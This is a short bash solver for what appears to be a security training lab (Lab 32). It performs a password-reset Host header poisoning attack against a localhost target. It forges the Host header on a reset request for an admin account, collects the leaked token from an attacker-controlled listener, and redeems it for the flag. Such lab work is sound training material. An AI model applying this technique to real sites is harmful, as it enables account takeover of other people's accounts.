#!/usr/bin/env bash
# Lab 32 — the reset link is built from the Host header of the request that
# asked for it, so ask for one that points at you.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:9320}"
. "$(dirname "$0")/../lib/h5i.sh"
new_session lab32

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture --allow 127.0.0.1 >/dev/null

send "$SESSION" req_0 --create --set method=POST --set path=/api/reset \
    --set header.Content-Type=application/json \
    --set header.Host=127.0.0.1:9321 \
    --set json.email=admin@acme.test >/dev/null

TOKEN=""
for _ in $(seq 1 20); do
    LATEST="$(last "$SESSION")"
    TOKEN="$(send "$SESSION" "$LATEST" --create --set url=http://127.0.0.1:9321/seen \
        --set header.Host=127.0.0.1:9321 | body |
        python3 -c 'import re,sys
m = re.search(r"token=([0-9a-f]+)", sys.stdin.read())
print(m.group(1) if m else "")')"
    [ -n "$TOKEN" ] && break
    sleep 0.5
done
[ -n "$TOKEN" ] || { echo "no token arrived"; exit 1; }

send "$SESSION" req_0 --create --set path=/api/reset/use --set "query.token=$TOKEN" | flag
